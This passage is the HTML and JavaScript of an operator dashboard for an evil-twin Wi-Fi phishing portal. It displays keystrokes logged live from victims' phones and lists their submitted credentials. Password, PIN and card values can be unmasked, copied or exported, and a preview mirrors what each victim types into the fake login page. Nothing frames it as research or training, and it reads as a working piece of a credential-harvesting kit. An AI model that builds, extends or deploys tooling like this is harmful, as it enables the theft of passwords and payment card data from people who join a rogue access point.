class="pv-emoji">❇️</div><div class="pv-emoji">✳️</div><div class="pv-emoji">❎</div><div class="pv-emoji">🌐</div><div class="pv-emoji">💠</div><div class="pv-emoji">💤</div><div class="pv-emoji">♿</div><div class="pv-emoji">🚹</div><div class="pv-emoji">🚺</div><div class="pv-emoji">⚧️</div><div class="pv-emoji">❗</div><div class="pv-emoji">❓</div><div class="pv-emoji">‼️</div><div class="pv-emoji">⁉️</div><div class="pv-emoji">⚠️</div>
                  </div>
                  <div class="pv-emoji-category">Flags</div>
                  <div class="pv-emoji-grid">
                    <div class="pv-emoji">🏳️</div><div class="pv-emoji">🏴</div><div class="pv-emoji">🏁</div><div class="pv-emoji">🚩</div><div class="pv-emoji">🏳️‍🌈</div><div class="pv-emoji">🏴‍☠️</div><div class="pv-emoji">🇺🇸</div><div class="pv-emoji">🇬🇧</div><div class="pv-emoji">🇩🇪</div><div class="pv-emoji">🇫🇷</div><div class="pv-emoji">🇪🇸</div><div class="pv-emoji">🇮🇹</div><div class="pv-emoji">🇬🇭</div><div class="pv-emoji">🇳🇬</div><div class="pv-emoji">🇰🇪</div><div class="pv-emoji">🇿🇦</div><div class="pv-emoji">🇨🇦</div><div class="pv-emoji">🇧🇷</div><div class="pv-emoji">🇲🇽</div><div class="pv-emoji">🇯🇵</div><div class="pv-emoji">🇰🇷</div><div class="pv-emoji">🇨🇳</div><div class="pv-emoji">🇮🇳</div><div class="pv-emoji">🇦🇺</div>
                  </div>
                </div>
                <div class="pv-bottom"><span>123</span><span>live keys tap what keylog receives</span><span>🎤</span></div>
              </div>
              <div id="pv-finger">👆</div><div id="pv-finger-ring"></div>
            </div>
          </div>
        </div>
        <div class="grid2" id="live-body">%%LIVE_ROWS%%</div>
      </div></div>
    </div>
    <div class="card" id="keylog">
      <div class="cardhead"><div><h2>Keylog</h2><p>Persistent values per device &amp; field — survives restarts · <span id="hist-meta"></span></p></div>
        <div class="right"><button class="btn" id="btn-csv" title="download keylog table as CSV">CSV</button><button class="btn" id="btn-reveal">Reveal secrets: off</button></div></div>
      <div style="overflow-x:auto"><table class="tbl">
        <thead><tr><th>WHEN</th><th>DEVICE</th><th>FIELD</th><th>VALUE</th><th>PAGE</th></tr></thead>
        <tbody id="hist-body">%%HIST_ROWS%%</tbody>
      </table></div>
    </div>
    <div class="cols2">
      <div class="card" id="stream">
        <div class="cardhead"><div><h2>Event Stream</h2><p>Newest keystroke events as they arrive</p></div></div>
        <div class="cardbody" id="stream-body"><div class="empty">waiting for events…</div></div>
      </div>
      <div class="card" id="subs">
        <div class="cardhead"><div><h2>Submits</h2><p>Submitted credential lines</p></div></div>
        <div class="cardbody" id="subs-body">%%SUB_ROWS%%</div>
      </div>
    </div>
   </div>
   <div id="view-station" style="display:none">
    <div class="card">
      <div class="cardhead"><div><h2>Target Constellation</h2><p>Every keystroke fires a pulse from the victim to your portal</p></div>
        <div class="right"><span class="badge b-green" id="const-badge">orbit live</span></div></div>
      <div class="cardbody"><canvas class="chart" id="ch-const" height="230"></canvas></div>
    </div>
    <div class="card">
      <div class="cardhead"><div><h2>Activity</h2><p>Keystroke events with dates — animated, from the portal log</p></div>
        <div class="right"><button class="btn sm on" id="act-24">24H</button><button class="btn sm" id="act-14">14D</button><span class="badge b-gray" id="act-meta"></span></div></div>
      <div class="cardbody"><canvas class="chart" id="ch-act" height="200"></canvas></div>
    </div>
    <div class="card">
      <div class="cardhead"><div><h2>Live Ticker</h2><p>Newest keystrokes across all targets — stocks-tape style</p></div>
        <div class="right"><span class="badge b-green" id="tick-badge">tape live</span></div></div>
      <div class="cardbody"><div class="ticker" id="tick-body"><span style="color:var(--faint);font-size:12px">waiting for keystrokes…</span></div></div>
    </div>
    <div class="cols2">
      <div class="card">
        <div class="cardhead"><div><h2>Keystroke Rate</h2><p>Events per 10s · last 5 minutes</p></div></div>
        <div class="cardbody"><canvas class="chart" id="ch-line" height="190"></canvas></div>
      </div>
      <div class="card">
        <div class="cardhead"><div><h2>By Section</h2><p>Share of keystroke events per field</p></div></div>
        <div class="cardbody"><div class="donut-wrap"><canvas id="ch-donut" width="180" height="180" style="width:180px;height:180px"></canvas><div class="dlegend" id="donut-legend"><div class="empty">waiting…</div></div></div></div>
      </div>
    </div>
    <div class="cols2">
      <div class="card">
        <div class="cardhead"><div><h2>Top Devices</h2><p>Keystroke events per target</p></div></div>
        <div class="cardbody" id="dev-bars"><div class="empty">waiting…</div></div>
      </div>
      <div class="card">
        <div class="cardhead"><div><h2>Session Stats</h2><p>Derived from the live stream</p></div></div>
        <div class="cardbody"><div class="statgrid" id="sess-stats"><div class="empty" style="grid-column:1/-1">waiting…</div></div></div>
      </div>
    </div>
   </div>
  </div>
</div>
<div id="toast"></div>
<script>
"use strict";
window.onerror = function(msg){
  try{ document.getElementById("conn").textContent = "dashboard error: " + msg; }catch(e){}
};
var since = 0, totalEvents = 0, histEvents = 0, t0 = Date.now(), nfields = 0;
var paused = false, reveal = false;
try{ if(localStorage.getItem("iv-theme") === "dark") document.body.classList.add("dark"); }catch(e){}
function esc(s){ return String(s == null ? "" : s).replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;"); }
function isSecret(name){
  var n = String(name || "").toLowerCase();
  return n.indexOf("pass") >= 0 || n.indexOf("pwd") >= 0 || n.indexOf("secret") >= 0 ||
         n.indexOf("pin") >= 0 || n.indexOf("card") >= 0 || n.indexOf("cvv") >= 0;
}
function mask(s){ s = String(s == null ? "" : s); return s ? "[" + s.length + " chars] " + new Array(Math.min(s.length, 24) + 1).join("*") : ""; }
function showVal(field, v){ return (isSecret(field) && !reveal) ? mask(v) : esc(v); }
function roleBadge(name){
  var n = String(name || "").toLowerCase();
  if(/pass|pwd|secret|pin/.test(n)) return '<span class="badge b-red">PASSWORD</span>';
  if(/mail/.test(n)) return '<span class="badge b-cyan">EMAIL</span>';
  if(/card|ccnum|cvv|expire/.test(n)) return '<span class="badge b-violet">CARD</span>';
  if(/phone|tel|mobile/.test(n)) return '<span class="badge b-green">PHONE</span>';
  if(/user|login|account|nick/.test(n)) return '<span class="badge b-amber">USERNAME</span>';
  return '<span class="badge b-gray">FIELD</span>';
}
function agoBadge(ago){
  if(ago == null) return '<span class="badge b-gray">idle</span>';
  if(ago <= 3) return '<span class="badge b-green"><span class="tdots"><span></span><span></span><span></span></span>TYPING</span>';
  if(ago <= 15) return '<span class="badge b-amber">' + esc(ago) + 's ago</span>';
  return '<span class="badge b-gray">' + esc(ago) + 's ago</span>';
}
function tapeHtml(tape){
  if(!tape || !tape.length) return '<span style="color:var(--faint)">no keystrokes yet</span>';
  var SYM = {Enter: "&lt;RET&gt;", Backspace: "&lt;BKSP&gt;", Tab: "&lt;TAB&gt;", Escape: "&lt;ESC&gt;", Delete: "&lt;DEL&gt;"};
  return tape.slice(-40).map(function(e){
    var k = e.key || "", t = e.type || "", v = e.value || "", s;
    if(t === "focus") s = "[" + esc(e.field || "") + "]";
    else if(k === " ") s = " ";
    else if(SYM[k]) s = SYM[k];
    else if(k && k.length === 1) s = esc(k);
    else if(!k && v && (t === "input" || t === "change" || t === "paste" || t === "cut")) s = esc(v.slice(-1));
    else s = "";
    var fresh = (Date.now() / 1000 - (e.t || 0)) < 3 ? ' class="new"' : '';
    return '<span' + fresh + '>' + s + '</span>';
  }).join("");
}
function liveCard(ip, info){
  var ago = info.active_ago, typing = (ago != null && ago <= 3);
  var fields = info.fields || {};
  var active = info.live_field || info.active_field || "";
  var liveVal = info.live_value;
  if(liveVal == null) liveVal = fields[active] == null ? "" : fields[active];
  liveVal = String(liveVal);
  var names = Object.keys(fields).sort();
  var rows = names.length ? names.map(function(n){
    return '<div class="frow' + (n === active ? ' hot' : '') + '"><span class="fname">' +
      esc(n) + '</span><span class="fval copyable" data-v="' + escA(fields[n]) + '" title="click to copy">' + esc(fields[n]) + '</span></div>';
  }).join("") : '<div class="frow"><span class="fname">—</span><span class="fval">no fields captured yet</span></div>';
  var shown = liveVal.slice(-200);
  var vHtml = shown ? (typing && shown.length > 1
    ? esc(shown.slice(0, -1)) + '<span class="fresh-char">' + esc(shown.slice(-1)) + '</span>'
    : esc(shown)) : "—";
  return '<div class="dev' + (typing ? ' typing' : '') + '">' +
    '<div class="devhead"><span class="ip">' + esc(devName(ip)) + '</span>' +
    '<span class="mac">' + esc(info.mac || "-") + '</span><span class="tag">' + agoBadge(ago) + '</span></div>' +
    '<div class="devwhere">typing in <b>' + esc(active || "-") + '</b> @ ' + esc(String(info.page || "-").slice(-80)) + '</div>' +
    '<div class="lve"><div class="k">LIVE VALUE — <b>' + esc(active || "-") + '</b></div>' +
    '<div class="v copyable" data-v="' + escA(liveVal.slice(-200)) + '" title="click to copy">' + vHtml + '<span class="caret"></span></div>' +
    '<div class="m">' + liveVal.length + ' chars · unsubmitted · click value to copy</div></div>' +
    '<div>' + rows + '</div><div class="tape">' + tapeHtml(info.tape) + '</div></div>';
}
/* ----- victim phone: exact portal preview + live device badge ----- */
function pvClock(){
  try{
    var el = document.getElementById("pv-clock");
    if(el) el.textContent = new Date().toLocaleTimeString([], {hour: "2-digit", minute: "2-digit"});
  }catch(e){}
}
try{ pvClock(); setInterval(pvClock, 1000); }catch(e){}
var pvCurPortal = "";
function pvPortalInfo(){
  // label the phone with the portal victims actually see (run/last.conf).
  // auto-reloads the iframe when run.sh switches portals ([s]) live.
  api("/api/portal-info", function(info, ok){
    var el = document.getElementById("pv-portal-name");
    if(!el) return;
    if(ok && info && info.portal){
      el.textContent = info.portal + " · " + (info.entry || "");
      var key = info.portal + "|" + (info.entry || "");
      if(pvCurPortal && key !== pvCurPortal){
        var f = document.getElementById("pv-portal");
        if(f) f.src = "/api/portal?ts=" + Date.now();
      }
      pvCurPortal = key;
    }
    else el.textContent = "portal…";
    el.title = ok && info ? ("SSID " + (info.ssid || "—") + " · gw " + (info.gateway || "—")) : "";
  });
}
try{
  pvPortalInfo(); setInterval(function(){ if(!document.hidden) pvPortalInfo(); }, 10000);
  var _pr = document.getElementById("pv-reload");
  if(_pr) _pr.addEventListener("click", function(){
    var f = document.getElementById("pv-portal");
    if(f) f.src = "/api/portal?ts=" + Date.now();
    pvPortalInfo();
  });
  var _po = document.getElementById("pv-open");
  if(_po) _po.addEventListener("click", function(){ window.open("/api/portal", "_blank"); });
}catch(e){}
/* ----- Dynamic Island Pro Max: control center with tabs / live / actions ----- */
var pvPinnedIp = "";
var pvWaveTaps = [];
var pvIslandTab = "devices";
function pvIslandOpen(open){
  try{
    var p = document.getElementById("pv-phone");
    if(!p) return;
    if(open === undefined) p.classList.toggle("island-open");
    else if(open) p.classList.add("island-open");
    else p.classList.remove("island-open");
    if(p.classList.contains("island-open")) pvWaveKick();
  }catch(_){}
}
function pvIslandSetTab(name){
  try{
    pvIslandTab = name;
    var tabs = document.querySelectorAll ? document.querySelectorAll(".pv-tabs button") : [];
    for(var i = 0; i < tabs.length; i++) tabs[i].classList.toggle("on", tabs[i].getAttribute("data-tab") === name);
    var panes = {"devices": "pv-tab-devices", "live": "pv-tab-live", "actions": "pv-tab-actions"};
    Object.keys(panes).forEach(function(k){
      var el = document.getElementById(panes[k]);
      if(el) el.classList.toggle("on", k === name);
    });
    if(name === "live") pvWaveKick();
  }catch(_){}
}
function pvIslandFlash(){
  try{
    var isl = document.getElementById("pv-island");
    if(!isl) return;
    isl.classList.remove("shake"); void isl.offsetWidth; isl.classList.add("shake");
    setTimeout(function(){ isl.classList.remove("shake"); }, 450);
  }catch(_){}
}
function pvWaveKick(){
  try{
    var cv = document.getElementById("pv-wave");
    if(!cv || cv._run) return;
    cv._run = true;
    var ctx = cv.getContext("2d");
    var draw = function(){
      var W = cv.width, H = cv.height;
      ctx.clearRect(0, 0, W, H);
      var now = Date.now();
      pvWaveTaps = pvWaveTaps.filter(function(t){ return now - t < 4000; });
      ctx.fillStyle = "#26334e";
      for(var i = 0; i < 32; i++){
        var x = 6 + i * ((W - 12) / 31);
        var idle = 3 + Math.sin(now / 500 + i * 0.7) * 2;
        var boost = 0;
        for(var j = 0; j < pvWaveTaps.length; j++){
          var age = (now - pvWaveTaps[j]) / 1000;
          var pos = i / 31;
          var wavePos = 1 - age / 1.2;
          if(wavePos > 0) boost += Math.max(0, 18 * wavePos * Math.exp(-Math.pow((pos - (1 - wavePos)) * 6, 2)));
        }
        var h = Math.min(H - 8, idle + boost);
        var typing = boost > 4;
        ctx.fillStyle = typing ? "#25e887" : "rgba(60,80,224,.55)";
        var y = (H - h) / 2;
        if(ctx.roundRect){ ctx.beginPath(); ctx.roundRect(x - 2, y, 4, h, 2); ctx.fill(); }
        else ctx.fillRect(x - 2, y, 4, h);
      }
      ctx.fillStyle = "#26334e";
      if(!document.hidden) requestAnimationFrame(draw);
      else { cv._run = false; return; }
      var phone = document.getElementById("pv-phone");
      if(!phone || !phone.classList.contains("island-open") || pvIslandTab !== "live"){
        // keep running in bg at low cost while open elsewhere? stop to save cpu
        if(!phone || !phone.classList.contains("island-open")){ cv._run = false; return; }
      }
    };
    requestAnimationFrame(draw);
  }catch(_){}
}
function pvIslandCopyLive(btn){
  try{
    var v = (typeof pvPrevText !== "undefined" ? pvPrevText : "") || "";
    var valEl = document.getElementById("pv-island-value");
    if(valEl && valEl.textContent && valEl.textContent !== "waiting…") v = v || valEl.textContent;
    if(!v){ if(typeof toast === "function") toast("nothing live to copy yet"); return; }
    var done = function(){ if(typeof toast === "function") toast("live value copied"); };
    if(btn){ btn.classList.remove("flash"); void btn.offsetWidth; btn.classList.add("flash"); }
    pvIslandFlash();
    if(navigator.clipboard && navigator.clipboard.writeText) navigator.clipboard.writeText(v).then(done, done);
    else{ var ta = document.createElement("textarea"); ta.value = v; document.body.appendChild(ta); ta.select(); try{ document.execCommand("copy"); }catch(_){} ta.remove(); done(); }
  }catch(_){}
}
try{
  var _isl = document.getElementById("pv-island");
  var _phone = document.getElementById("pv-phone");
  if(_isl && _phone){
    _isl.addEventListener("click", function(e){
      if(e.target && e.target.closest && (e.target.closest(".pv-island-dev") || e.target.closest(".pv-act") || e.target.closest(".pv-tabs"))) return;
      if(e.target && (e.target.id === "pv-island-close")) return;
      pvIslandOpen();
    });
    // double-click = pin/unpin hottest typer without opening
    _isl.addEventListener("dblclick", function(e){
      try{
        e.preventDefault();
        var live = window._pvLastLive || null;
        if(pvPinnedIp){ pvPinnedIp = ""; if(typeof toast === "function") toast("unpinned — back to auto"); }
        else if(live){
          var best = "", bestAgo = 1e9;
          Object.keys(live).forEach(function(ip){ var a = (live[ip] || {}).active_ago; if(a == null) a = 1e9; if(a < bestAgo){ bestAgo = a; best = ip; } });
          if(best){ pvPinnedIp = best; if(typeof toast === "function") toast("pinned " + best); pvIslandOpen(true); pvIslandSetTab("devices"); }
        }
        pvWaveTaps.push(Date.now());
      }catch(_){}
    });
  }
  var _islClose = document.getElementById("pv-island-close");
  if(_islClose) _islClose.addEventListener("click", function(e){
    try{ e.stopPropagation(); }catch(_){}
    pvIslandOpen(false);
  });
  document.addEventListener("click", function(e){
    try{
      var p = document.getElementById("pv-phone");
      var isl = document.getElementById("pv-island");
      if(!p || !isl || !p.classList.contains("island-open")) return;
      if(p.contains(e.target)) return;
      pvIslandOpen(false);
    }catch(_){}
  });
  document.addEventListener("keydown", function(e){
    try{
      var tag = (document.activeElement && document.activeElement.tagName) || "";
      if(e.key === "Escape"){ pvIslandOpen(false); }
      else if((e.key === "i" || e.key === "I") && tag !== "INPUT" && tag !== "TEXTAREA"){ pvIslandOpen(); }
    }catch(_){}
  });
  // tabs
  var _tabs = document.querySelectorAll ? document.querySelectorAll(".pv-tabs button") : [];
  for(var _ti = 0; _ti < _tabs.length; _ti++){
    (function(b){
      b.addEventListener("click", function(e){ try{ e.stopPropagation(); }catch(_){} pvIslandSetTab(b.getAttribute("data-tab") || "devices"); pvWaveTaps.push(Date.now()); });
    })(_tabs[_ti]);
  }
  var _click = function(id, fn){
    var el = document.getElementById(id);
    if(el) el.addEventListener("click", function(e){ try{ e.stopPropagation(); }catch(_){} fn(el); });
  };
  _click("pv-act-copy", function(b){ pvIslandCopyLive(b); });
  _click("pv-act-reveal", function(b){ var t = document.getElementById("btn-reveal"); if(t) t.click(); b.classList.toggle("on"); setTimeout(function(){ if(typeof pollHist === "function") pollHist(); }, 50); });
  _click("pv-act-pause", function(b){ var t = document.getElementById("btn-pause"); if(t) t.click(); b.classList.toggle("on", document.getElementById("btn-pause").textContent !== "Pause"); });
  _click("pv-act-reload", function(b){ var t = document.getElementById("pv-reload"); if(t) t.click(); b.classList.add("flash"); setTimeout(function(){ b.classList.remove("flash"); }, 550); });
  _click("pv-act-open", function(){ var t = document.getElementById("pv-open"); if(t) t.click(); });
  _click("pv-act-theme", function(b){ var t = document.getElementById("btn-theme"); if(t) t.click(); b.classList.toggle("on"); });
  _click("pv-act-export", function(b){ var t = document.getElementById("btn-export"); if(t) t.click(); b.classList.add("flash"); setTimeout(function(){ b.classList.remove("flash"); }, 550); });
  _click("pv-act-flash", function(){ pvIslandFlash(); if(typeof toast === "function") toast("⚡ island ping"); });
}catch(e){}
function pvIslandTag(ago){
  if(ago == null) return {t: "idle", c: "idle"};
  if(ago <= 3) return {t: "TYPING", c: "typing"};
  if(ago <= 15) return {t: ago + "s", c: "recent"};
  return {t: ago + "s", c: "idle"};
}
function pvRenderIsland(live){
  try{
    window._pvLastLive = live || null;
    var list = document.getElementById("pv-island-list");
    var hint = document.getElementById("pv-island-hint");
    var foot = document.getElementById("pv-island-foot");
    var compact = document.getElementById("pv-island-compact");
    var isl = document.getElementById("pv-island");
    var title = document.getElementById("pv-island-title");
    if(!list) return;
    var ips = live ? Object.keys(live) : [];
    ips.sort(function(a, b){
      var aa = (live[a] || {}).active_ago, bb = (live[b] || {}).active_ago;
      if(aa == null) aa = 1e9; if(bb == null) bb = 1e9; return aa - bb;
    });
    // drop a pin that vanished
    if(pvPinnedIp && ips.indexOf(pvPinnedIp) < 0) pvPinnedIp = "";
    // hottest typer drives collapsed preview + glow + live tab
    var hot = null, hotIp = "";
    if(pvPinnedIp && live && live[pvPinnedIp]){ hotIp = pvPinnedIp; hot = live[pvPinnedIp]; }
    else if(ips.length){ hotIp = ips[0]; hot = live[hotIp]; }
    var typing = !!(hot && hot.active_ago != null && hot.active_ago <= 3);
    if(isl) isl.classList.toggle("typing", typing);
    if(compact) compact.classList.toggle("typing", typing);
    if(title) title.textContent = typing ? ("◉ LIVE · " + (hotIp.split(".").slice(-1)[0] || hotIp)) : (ips.length ? ("CONTROL CENTER · " + ips.length) : "CONTROL CENTER");
    if(hot){
      var hf = String(hot.live_field || hot.active_field || "");
      var hv = hot.live_value;
      if(hv == null) hv = ((hot.fields || {})[hf]) || "";
      hv = String(hv);
      var tail = hv.slice(-10) || "…";
      if(hint) hint.innerHTML = esc(hf ? (hf.slice(0, 8) + ": ") : "") + "<b>" + esc(tail) + "</b>" + (typing ? " ●" : "");
      var fEl = document.getElementById("pv-island-field");
      var vEl = document.getElementById("pv-island-value");
      if(fEl) fEl.textContent = (hf || "—") + (pvPinnedIp === hotIp ? " · 📌" : " · auto");
      if(vEl && vEl.textContent !== hv.slice(-40)) vEl.textContent = hv.slice(-40) || "…";
      var tapeEl = document.getElementById("pv-island-tape");
      if(tapeEl){
        var tp = (hot.tape || []).slice(-6).map(function(e){
          var k = (e && (e.key || "")) || "";
          if(k === " ") return "␣";
          return k.length === 1 ? k : "·";
        }).join(" ");
        tapeEl.innerHTML = "keys <b>" + esc(tp || "—") + "</b> · " + hv.length + " chars";
      }
    } else {
      if(hint) hint.textContent = pvPinnedIp ? ("● " + pvPinnedIp.split(".").slice(-1)[0]) : "tap · auto";
    }
    if(!ips.length){
      list.innerHTML = '<div class="pv-island-empty">no devices yet — connect a phone to the AP</div>';
      if(foot) foot.textContent = "auto = hottest typer · tap a device to pin it";
      return;
    }
    var html = '<button class="pv-island-dev' + (!pvPinnedIp ? " pinned" : "") + '" data-ip="">' +
      '<span class="ip">✦ Auto</span><span class="mac">hottest typer</span>' +
      '<span class="tag ' + (!pvPinnedIp ? "typing" : "idle") + '">' + (!pvPinnedIp ? "ON" : "AUTO") + "</span></button>";
    html += ips.slice(0, 8).map(function(ip){
      var inf = live[ip] || {};
      var nm = (typeof devName === "function") ? devName(ip) : ip;
      var tg = pvIslandTag(inf.active_ago);
      return '<button class="pv-island-dev' + (pvPinnedIp === ip ? " pinned" : "") + '" data-ip="' + ip + '">' +
        '<span class="ip">' + esc(String(nm).split(" · ")[0]).slice(0, 18) + '</span>' +
        '<span class="mac">' + esc(ip) + "</span>" +
        '<span class="tag ' + tg.c + '">' + esc(tg.t) + "</span></button>";
    }).join("");
    list.innerHTML = html;
    if(foot) foot.textContent = pvPinnedIp ? ("pinned: " + pvPinnedIp + " · tap Auto to release") : "auto = hottest typer · tap a device to pin it";
    var btns = list.querySelectorAll ? list.querySelectorAll(".pv-island-dev") : [];
    for(var i = 0; i < btns.length; i++){
      (function(b){
        b.addEventListener("click", function(e){
          try{ e.stopPropagation(); }catch(_){}
          pvPinnedIp = b.getAttribute("data-ip") || "";
          // reset diff so the newly pinned screen fills without a burst of taps
          pvPrevKey = "";
          pvRenderIsland(live);
        });
      })(btns[i]);
    }
  }catch(_){}
}
/* ----- live keyboard driver: taps EXACTLY what the keylog receives ----- */
var pvKeyMap = null, pvEmojiMap = null, pvQueue = Promise.resolve();
var pvPrevIp = "", pvPrevKey = "", pvPrevText = "", pvLastTap = 0;
function pvBuildMaps(){
  if(!pvKeyMap){
    pvKeyMap = {};
    var ks = document.querySelectorAll ? document.querySelectorAll("#pv-normalkb .pv-key") : [];
    for(var i = 0; i < ks.length; i++){
      var k = ks[i].getAttribute ? ks[i].getAttribute("data-k") : null;
      if(!k) k = (ks[i].textContent || "").trim().toUpperCase();
      if(k) pvKeyMap[k] = ks[i];
    }
  }
  if(!pvEmojiMap){
    pvEmojiMap = {};
    var es = document.querySelectorAll ? document.querySelectorAll(".pv-emoji") : [];
    for(var j = 0; j < es.length; j++){
      var ch = (es[j].textContent || "").trim();
      if(ch && !pvEmojiMap[ch]) pvEmojiMap[ch] = es[j];
    }
  }
}
function pvPredictions(text){
  try{
    var w = String(text || "").trim().split(/\s+/);
    var cur = w[w.length - 1] || "";
    var p = [cur || "the", cur ? cur + "s" : "this", cur ? cur + "ing" : "that"];
    for(var i = 1; i <= 3; i++){
      var el = document.getElementById("pv-prediction" + i);
      if(el) el.textContent = p[i - 1];
    }
  }catch(e){}
}
function pvShowKb(normal){
  try{
    var n = document.getElementById("pv-normalkb");
    var e = document.getElementById("pv-emojipanel");
    if(!n || !e) return;
    if(normal){ n.style.display = ""; e.classList.remove("show"); }
    else { n.style.display = "none"; e.classList.add("show"); }
  }catch(_){}
}
function pvFingerTo(el){
  try{
    var phone = document.querySelector ? document.querySelector(".pv-phone") : null;
    var f = document.getElementById("pv-finger"), r = document.getElementById("pv-finger-ring");
    if(!phone || !el || !f || !r) return;
    var pr = phone.getBoundingClientRect(), er = el.getBoundingClientRect();
    var x = er.left - pr.left + er.width / 2, y = er.top - pr.top + er.height / 2;
    f.style.left = x + "px"; f.style.top = y + "px"; f.style.opacity = "1";
    r.style.left = x + "px"; r.style.top = y + "px";
  }catch(_){}
}
function pvTapAnim(el, isEmoji){
  pvFingerTo(el);
  try{
    var f = document.getElementById("pv-finger"), r = document.getElementById("pv-finger-ring");
    if(r){ r.classList.remove("show"); void r.offsetWidth; r.classList.add("show"); }
    if(f){ f.classList.add("tap"); setTimeout(function(){ f.classList.remove("tap"); }, 180); }
    pvLastTap = Date.now();
  }catch(_){}
  if(!el) return;
  try{
    if(isEmoji){ el.classList.add("selected"); setTimeout(function(){ el.classList.remove("selected"); }, 400); }
    else { el.classList.add("hit"); setTimeout(function(){ el.classList.remove("hit"); }, 160); }
  }catch(_){}
}
function pvFindKey(ch){
  pvBuildMaps();
  if(ch === " ") return pvKeyMap["SPACE"] || null;
  if(ch === "\n" || ch === "\r") return pvKeyMap["ENTER"] || null;
  if(!ch) return null;
  var up = String(ch).toUpperCase();
  if(pvKeyMap[up]) return pvKeyMap[up];
  if(ch === ",") return pvKeyMap[","] || null;
  if(ch === ".") return pvKeyMap["."] || null;
  return null;
}
function pvHumanDelay(ch){
  // human-like rhythm: fast bursts + occasional think pause, like phone.html demo
  if(ch === " ") return 150 + Math.random() * 80;
  if(ch === "\n" || ch === "\r") return 220;
  if(Math.random() < 0.06) return 280 + Math.random() * 200; // think pause
  return 45 + Math.random() * 95;
}
function pvTapChar(ch){
  // smooth like actual typing: human delays, in order, never overlaps
  pvQueue = pvQueue.then(function(){
    return new Promise(function(done){
      try{
        pvBuildMaps();
        // emoji first: any char present in the emoji grid taps there
        if(ch && pvEmojiMap[ch]){
          pvShowKb(false);
          var ee = pvEmojiMap[ch];
          pvTapAnim(ee, true);
          setTimeout(done, 220 + Math.random() * 80);
          return;
        }
        // backspace/delete handled by caller with "" flag; here normal chars
        pvShowKb(true);
        var k = pvFindKey(ch);
        if(k) pvTapAnim(k, false);
        setTimeout(done, pvHumanDelay(ch));
      }catch(_){ setTimeout(done, 60); }
    });
  });
  return pvQueue;
}
function pvTapBackspace(){
  pvQueue = pvQueue.then(function(){
    return new Promise(function(done){
      try{
        pvBuildMaps(); pvShowKb(true);
        var k = pvKeyMap["BKSP"];
        if(k) pvTapAnim(k, false);
      }catch(_){}
      setTimeout(done, 70 + Math.random() * 40);
    });
  });
}
function pvSensorLabel(doc, el){
  // same priority as portal_server sensor lbl(): name > label[for] > id >
  // placeholder > aria-label/data-testid > autocomplete > type/tag
  try{
    if(el.name) return String(el.name).slice(0, 60);
    if(el.id){
      var lab = null;
      try{ lab = doc.querySelector('label[for="' + String(el.id).replace(/"/g, "") + '"]'); }catch(_){}
      if(lab && lab.innerText) return lab.innerText.trim().slice(0, 60);
      return String(el.id).slice(0, 60);
    }
    if(el.placeholder) return String(el.placeholder).slice(0, 60);
    var al = (el.getAttribute && (el.getAttribute("aria-label") || el.getAttribute("data-testid"))) || "";
    if(al) return String(al).slice(0, 60);
    if(el.autocomplete && el.autocomplete !== "off") return String(el.autocomplete).slice(0, 60);
    return ((el.type || el.tagName || "field").toLowerCase()).slice(0, 40);
  }catch(_){ return "field"; }
}
function pvMirrorToPortal(field, value, allFields){
  // Fill EVERY captured field into the preview so the end state looks
  // exactly like the victim phone. Same-origin iframe only, best-effort.
  try{
    var f = document.getElementById("pv-portal");
    if(!f || !f.contentDocument) return;
    var doc = f.contentDocument;
    var els = doc.querySelectorAll ? doc.querySelectorAll("input,textarea,select") : [];
    // build lookup: exact label -> value, plus lowercase map for fuzzy match
    var lowerMap = {};
    if(allFields){
      Object.keys(allFields).forEach(function(k){
        lowerMap[String(k).toLowerCase()] = allFields[k];
      });
    }
    for(var i = 0; i < els.length; i++){
      (function(el){
        try{
          var ty = (el.type || "").toLowerCase();
          if(ty === "hidden" || ty === "submit" || ty === "button" || ty === "image" || ty === "file") return;
          var label = pvSensorLabel(doc, el);
          var lk = String(label).toLowerCase();
          var val = undefined;
          if(allFields){
            if(Object.prototype.hasOwnProperty.call(allFields, label)) val = allFields[label];
            else if(Object.prototype.hasOwnProperty.call(lowerMap, lk)) val = lowerMap[lk];
            else {
              // fuzzy: field key appears in haystack or vice versa
              var hay = ((el.name || "") + " " + (el.id || "") + " " + (el.placeholder || "") + " " + (el.getAttribute("aria-label") || "") + " " + (el.autocomplete || "")).toLowerCase();
              var keys = Object.keys(allFields);
              for(var k = 0; k < keys.length; k++){
                var fk = String(keys[k]).toLowerCase();
                if(!fk || !hay) continue;
                if(hay.indexOf(fk) >= 0 || fk.indexOf(hay.split(" ")[0]) >= 0){ val = allFields[keys[k]]; break; }
              }
            }
          }
          // fall back to single active field (older live payloads)
          if(val === undefined && field && label === field) val = value;
          var isActive = field && (label === field || String(label).toLowerCase() === String(field).toLowerCase());
          try{ el.style.outline = ""; el.style.boxShadow = ""; }catch(_){}
          if(val !== undefined){
            var s = String(val == null ? "" : val);
            if(el.tagName === "SELECT"){ try{ el.value = s; }catch(_){} }
            else if(el.type === "checkbox" || el.type === "radio"){ /* sensor stores [checked]; skip visual */ }
            else if("value" in el && el.value !== s){
              // set native value + fire events so Material/Google UIs react
              // (float label, enable Next button)
              var proto = null;
              try{
                if(el.tagName === "TEXTAREA") proto = window.HTMLTextAreaElement ? window.HTMLTextAreaElement.prototype : null;
                else proto = window.HTMLInputElement ? window.HTMLInputElement.prototype : null;
              }catch(_){}
              try{
                if(proto){
                  var desc = Object.getOwnPropertyDescriptor(proto, "value");
                  if(desc && desc.set) desc.set.call(el, s);
                  else el.value = s;
                } else el.value = s;
              }catch(_){ try{ el.value = s; }catch(__){} }
              try{
                var ev = new Event("input", {bubbles: true});
                el.dispatchEvent(ev);
              }catch(_){ try{ var e2 = doc.createEvent("HTMLEvents"); e2.initEvent("input", true, true); el.dispatchEvent(e2); }catch(__){} }
              try{ var ch = new Event("change", {bubbles: true}); el.dispatchEvent(ch); }catch(_){}
            }
          }
          if(isActive){
            try{ el.style.outline = "2px solid #4285f4"; el.style.boxShadow = "0 0 0 3px rgba(66,133,244,.25)"; }catch(_){}
            try{ if(el.scrollIntoView) el.scrollIntoView({block: "nearest", behavior: "smooth"}); }catch(_){}
          }
        }catch(_){}
      })(els[i]);
    }
  }catch(_){}
}
setInterval(function(){
  try{
    if(Date.now() - pvLastTap > 2500){
      var f = document.getElementById("pv-finger");
      if(f && f.style.opacity !== "0") f.style.opacity = "0";
    }
  }catch(_){}
}, 1000);
function pvRender(ip, field, value, ago, mac, allFields){
  var devEl = document.getElementById("pv-device");
  var badgeEl = document.getElementById("pv-livebadge");
  var labEl = document.getElementById("pv-live-label");
  if(!devEl) return;
